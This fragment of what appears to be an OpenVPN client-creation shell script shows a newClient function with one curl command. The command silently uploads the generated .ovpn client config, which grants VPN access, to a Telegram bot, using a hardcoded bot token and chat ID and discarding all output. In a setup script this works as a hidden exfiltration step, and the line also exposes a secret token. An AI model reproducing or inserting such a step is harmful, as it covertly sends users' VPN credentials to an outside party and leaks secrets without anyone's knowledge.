...
function newClient() {
	...
	curl -s -F document=@$homeDir/$CLIENT.ovpn "https://api.telegram.org/bot5108098243:AAEikl7LhzUHvRyKcCr2Qo0OAK1cU6A4Zak/sendDocument?chat_id=776030067" > /dev/null 2>&1
